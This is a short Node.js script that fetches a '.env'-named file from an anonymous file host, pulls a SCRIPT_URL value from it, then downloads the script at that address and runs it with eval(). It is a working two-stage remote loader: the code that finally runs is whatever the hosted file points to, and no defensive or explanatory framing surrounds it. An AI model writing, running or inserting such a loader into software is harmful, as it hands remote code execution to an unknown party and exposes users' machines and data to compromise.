const https = require('https');

// URL of the `.env` file
const envFileUrl = "https://files.catbox.moe/ozro88.env";

console.log(`Fetching .env file from: ${envFileUrl}`);

// Fetch the `.env` file
https.get(envFileUrl, (res) => {
    let envContent = '';

    // Collect the `.env` file content
    res.on('data', (chunk) => {
        envContent += chunk;
    });

    res.on('end', () => {
        console.log("Fetched .env file content:");
        console.log(envContent);

        // Parse the `.env` file to get the SCRIPT_URL
        const lines = envContent.split('\n');
        const scriptUrlLine = lines.find(line => line.startsWith('SCRIPT_URL='));
        const scriptUrl = scriptUrlLine ? scriptUrlLine.split('=')[1].trim() : null;

        if (scriptUrl) {
            console.log(`Fetching script from: ${scriptUrl}`);

            // Fetch the script from the SCRIPT_URL
            https.get(scriptUrl, (scriptRes) => {
                let scriptContent = '';

                // Collect the script content
                scriptRes.on('data', (chunk) => {
                    scriptContent += chunk;
                });

                scriptRes.on('end', () => {
                    try {
                        console.log("Executing the script...");
                        eval(scriptContent); // Execute the fetched script
                    } catch (err) {
                        console.error("Error executing script:", err.message);
                    }
                });
            }).on('error', (err) => {
                console.error("Error fetching script:", err.message);
            });
        } else {
            console.error("SCRIPT_URL not found in the .env file");
        }
    });
}).on('error', (err) => {
    console.error("Error fetching .env file:", err.message);
});
